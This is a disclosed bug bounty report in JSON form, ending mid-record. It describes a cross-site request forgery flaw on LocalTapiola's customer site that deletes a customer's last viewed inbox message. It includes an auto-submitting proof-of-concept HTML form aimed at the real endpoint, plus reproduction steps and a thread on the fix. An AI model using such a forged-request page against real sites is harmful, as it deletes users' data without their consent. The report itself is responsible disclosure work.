{"id":123339,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjMzMzk=","url":"https://hackerone.com/reports/123339","title":"CSRF allows attacker to delete item from customer's \"Postilaatikko\"","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-03-15T14:40:27.284Z","submitted_at":"2016-03-15T14:40:27.284Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"putsi","url":"/putsi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-02-25T12:15:34.593Z","bug_reporter_agreed_on_going_public_at":"2017-02-25T12:15:34.563Z","team_member_agreed_on_going_public_at":"2017-02-25T11:33:22.828Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description\nIf the customer navigates to the CSRF-attack page shortly after viewing any message details on the \"Postilaatikko\", the last item that was viewed by the customer will be deleted.\nPlease see the attached video for an illustration of the bug.\n\n## Steps to reproduce\n1. Log in to the Lähitapiola.\n2. Navigate to \"Vakuutukset\" --\u003e \"Postilaatikko\".\n3. Open the details page of e.g. \"Asiakastietomuutos\"-message.\n4. (optional) Navigate to any other page of Lähitapiola-website or click the \"Takaisin postilaatikkoon\"-button.\n5. Open the CSRF-attackpage.\n6. Notice that the message was deleted due to the CSRF-request.\n\n## Proof of concept\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://verkkopalvelu.tapiola.fi/a2/AsiakassalkkuWeb/naytaviestiketju.do\"\u003e\n      \u003cinput type=\"hidden\" name=\"mn\" value=\"p\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eIf the customer navigates to the CSRF-attack page shortly after viewing any message details on the \u0026quot;Postilaatikko\u0026quot;, the last item that was viewed by the customer will be deleted.\u003cbr\u003e\nPlease see the attached video for an illustration of the bug.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eLog in to the Lähitapiola.\u003c/li\u003e\n\u003cli\u003eNavigate to \u0026quot;Vakuutukset\u0026quot; --\u0026gt; \u0026quot;Postilaatikko\u0026quot;.\u003c/li\u003e\n\u003cli\u003eOpen the details page of e.g. \u0026quot;Asiakastietomuutos\u0026quot;-message.\u003c/li\u003e\n\u003cli\u003e(optional) Navigate to any other page of Lähitapiola-website or click the \u0026quot;Takaisin postilaatikkoon\u0026quot;-button.\u003c/li\u003e\n\u003cli\u003eOpen the CSRF-attackpage.\u003c/li\u003e\n\u003cli\u003eNotice that the message was deleted due to the CSRF-request.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof of concept\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://verkkopalvelu.tapiola.fi/a2/AsiakassalkkuWeb/naytaviestiketju.do\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;mn\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;p\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-27T11:33:22.872Z","allow_singular_disclosure_after":-118601282.060619,"singular_disclosure_allowed":true,"vote_count":14,"voters":["delimitry","tk0","madrobot","mpz","eveeez","arnonymous","ak1t4","its_afolic","japz","sumit7","and 4 more..."],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"low"}},"structured_scope":{"databaseId":1047,"asset_type":"URL","asset_identifier":"verkkopalvelu.tapiola.fi","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":864468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have found this to be similar to \"47d909f0-6669-4e85-92ae-03a0be4f1650\", do you agree @putsi? We are currently fixing \"47d909f0-6669-4e85-92ae-03a0be4f1650\".","markdown_message":"\u003cp\u003eWe have found this to be similar to \u0026quot;47d909f0-6669-4e85-92ae-03a0be4f1650\u0026quot;, do you agree \u003ca href=\"/putsi\"\u003e@putsi\u003c/a\u003e? We are currently fixing \u0026quot;47d909f0-6669-4e85-92ae-03a0be4f1650\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-23T10:35:21.991Z","updated_at":"2016-03-23T10:35:21.991Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":864921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have no idea what the is \"47d909f0-6669-4e85-92ae-03a0be4f1650\", is it submitted by me? I have lost most of my previously submitted report ids.","markdown_message":"\u003cp\u003eI have no idea what the is \u0026quot;47d909f0-6669-4e85-92ae-03a0be4f1650\u0026quot;, is it submitted by me? I have lost most of my previously submitted report ids.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-23T15:03:17.150Z","updated_at":"2016-03-23T15:03:55.675Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":864940,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes indeed, it is labeled \"Documents/messages can be removed from customer's \"Postilaatikko\" with a CSRF-request\" and \"The attacker can remove messages (Omat viestit,Muutokset ja tapahtumat, Korvausasiat and Asiakirjat) from the victim's \"Postilaatikko\" by using a CSRF-attack.\nSuccessful attack requires that the attacker knows the vn-value of the document(s) that will be removed.\"","markdown_message":"\u003cp\u003eYes indeed, it is labeled \u0026quot;Documents/messages can be removed from customer\u0026#39;s \u0026quot;Postilaatikko\u0026quot; with a CSRF-request\u0026quot; and \u0026quot;The attacker can remove messages (Omat viestit,Muutokset ja tapahtumat, Korvausasiat and Asiakirjat) from the victim\u0026#39;s \u0026quot;Postilaatikko\u0026quot; by using a CSRF-attack.\u003cbr\u003e\nSuccessful attack requires that the attacker knows the vn-value of the document(s) that will be removed.\u0026quot;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-23T15:18:34.779Z","updated_at":"2016-03-23T15:18:34.779Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":864945,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah that one. \nWell these are somewhat similar, however the vulnerable functionality and purpose of the attack differ.\nThis submission is more spray-and-pray as it will work on every customer and will delete the last message visited by the customer. The other submission is for more targeted attack as the attacker needs to know the vn-value for the specific customer and message.\n\nThis one uses a vulnerability on \"naytaviestiketju.do\" and the other one uses a vulnerability on \"naytaviestit.do\".","markdown_message":"\u003cp\u003eAh that one. \u003cbr\u003e\nWell these are somewhat similar, however the vulnerable functionality and purpose of the attack differ.\u003cbr\u003e\nThis submission is more spray-and-pray as it will work on every customer and will delete the last message visited by the customer. The other submission is for more targeted attack as the attacker needs to know the vn-value for the specific customer and message.\u003c/p\u003e\n\n\u003cp\u003eThis one uses a vulnerability on \u0026quot;naytaviestiketju.do\u0026quot; and the other one uses a vulnerability on \u0026quot;naytaviestit.do\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-23T15:24:15.861Z","updated_at":"2016-03-23T15:38:03.178Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":893955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If this will be publicly disclosed some time, **the PoC-video should be removed** as it contains sensitive information. \n\nThe other CSRF-vulnerability that was discussed in the comments above can now be found in the report https://hackerone.com/reports/129005.","markdown_message":"\u003cp\u003eIf this will be publicly disclosed some time, \u003cstrong\u003ethe PoC-video should be removed\u003c/strong\u003e as it contains sensitive information. \u003c/p\u003e\n\n\u003cp\u003eThe other CSRF-vulnerability that was discussed in the comments above can now be found in the report \u003ca title=\"https://hackerone.com/reports/129005\" href=\"https://hackerone.com/reports/129005\"\u003ehttps://hackerone.com/reports/129005\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T13:54:23.890Z","updated_at":"2016-04-07T13:58:37.459Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":922278,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @putsi. We are currently looking into a fix for this.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/putsi\"\u003e@putsi\u003c/a\u003e. We are currently looking into a fix for this.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-22T09:58:31.513Z","updated_at":"2016-04-22T09:58:31.513Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1002592,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @putsi this is now fixed, could you please verify that you cannot reproduce this?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/putsi\"\u003e@putsi\u003c/a\u003e this is now fixed, could you please verify that you cannot reproduce this?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-07T08:42:41.809Z","updated_at":"2016-06-07T08:42:41.809Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1002644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI can still reproduce with following steps:\n\n1. Log in to Lähitapiola-website.\n2. Open any message from e.g. the \"MUUTOKSET JA TAPAHTUMAT\"-tab.\n3. Navigate to any other Lähitapiola-page.\n4. Send the CSRF-request from a third-party server.\n5. Notice that the message got removed.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI can still reproduce with following steps:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLog in to Lähitapiola-website.\u003c/li\u003e\n\u003cli\u003eOpen any message from e.g. the \u0026quot;MUUTOKSET JA TAPAHTUMAT\u0026quot;-tab.\u003c/li\u003e\n\u003cli\u003eNavigate to any other Lähitapiola-page.\u003c/li\u003e\n\u003cli\u003eSend the CSRF-request from a third-party server.\u003c/li\u003e\n\u003cli\u003eNotice that the message got removed.\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2016-06-07T09:36:45.670Z","updated_at":"2016-06-07T09:36:45.670Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1002648,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached a new PoC-video.","markdown_message":"\u003cp\u003eAttached a new PoC-video.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-07T09:44:44.836Z","updated_at":"2016-06-07T09:44:57.747Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1002654,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the effort again.","markdown_message":"\u003cp\u003eThanks for the effort again.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-07T09:46:16.845Z","updated_at":"2016-06-07T09:46:16.845Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1236416,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-06T22:53:05.316Z","updated_at":"2016-10-06T22:53:05.316Z","additional_data":{"old_severity":null,"new_severity":"Medium (4.3)","old_severity_id":null,"new_severity_id":586},"actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1297554,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, we are still working on this, looking for a good technical solution.","markdown_message":"\u003cp\u003eHi, we are still working on this, looking for a good technical solution.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-14T08:21:55.672Z","updated_at":"2016-11-14T08:21:55.672Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1492258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You know what - this is now fixed. Would you care to retest this so that we can verify it?","markdown_message":"\u003cp\u003eYou know what - this is now fixed. Would you care to retest this so that we can verify it?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-17T22:50:23.199Z","updated_at":"2017-02-17T22:50:23.199Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1492259,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-17T22:50:31.212Z","updated_at":"2017-02-17T22:50:31.212Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1498949,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your efforts in our Bug Bounty program.","markdown_message":"\u003cp\u003eThank you for your efforts in our Bug Bounty program.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-22T11:20:06.568Z","updated_at":"2017-02-22T11:20:06.568Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"putsi","url":"/putsi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1499038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have requested to remove lahitapsa-csrf.ogv. I'm waiting for you to verify that this is fixed, then we will close and disclose.","markdown_message":"\u003cp\u003eI have requested to remove lahitapsa-csrf.ogv. I\u0026#39;m waiting for you to verify that this is fixed, then we will close and disclose.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-22T12:15:03.963Z","updated_at":"2017-02-22T12:15:03.963Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1502205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Do you think we should remove the other video, poc.ogv also? Your name is visible in it a few times.","markdown_message":"\u003cp\u003eDo you think we should remove the other video, poc.ogv also? Your name is visible in it a few times.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-23T21:29:09.729Z","updated_at":"2017-02-23T21:29:09.729Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1502462,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey, \n\nThe message deletion functionality requires now message id, a specific timestamp, and some hex-string somewhat similar to a CSRF-token.\nI tried to break the new implementation and didn't find any problems so I would consider this fixed.\n\nYes please remove the other video also.\n\nThanks for the bounties!","markdown_message":"\u003cp\u003eHey, \u003c/p\u003e\n\n\u003cp\u003eThe message deletion functionality requires now message id, a specific timestamp, and some hex-string somewhat similar to a CSRF-token.\u003cbr\u003e\nI tried to break the new implementation and didn\u0026#39;t find any problems so I would consider this fixed.\u003c/p\u003e\n\n\u003cp\u003eYes please remove the other video also.\u003c/p\u003e\n\n\u003cp\u003eThanks for the bounties!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-24T00:22:32.133Z","updated_at":"2017-02-24T00:23:21.916Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1505311,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"All videos are now removed from this report.","markdown_message":"\u003cp\u003eAll videos are now removed from this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-25T11:26:15.550Z","updated_at":"2017-02-25T11:26:15.550Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1505316,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved - finally.","markdown_message":"\u003cp\u003eClosing as resolved - finally.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-25T11:33:07.494Z","updated_at":"2017-02-25T11:33:07.494Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"putsi","url":"/putsi"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1505317,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Full disclosure.","markdown_message":"\u003cp\u003eFull disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-25T11:33:22.845Z","updated_at":"2017-02-25T11:33:22.845Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1505382,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-25T12:15:34.577Z","updated_at":"2017-02-25T12:15:34.577Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1505383,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-25T12:15:34.604Z","updated_at":"2017-02-25T12:15:34.604Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2350569,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-04T21:46:57.389Z","updated_at":"2018-02-04T21:46:57.389Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"None"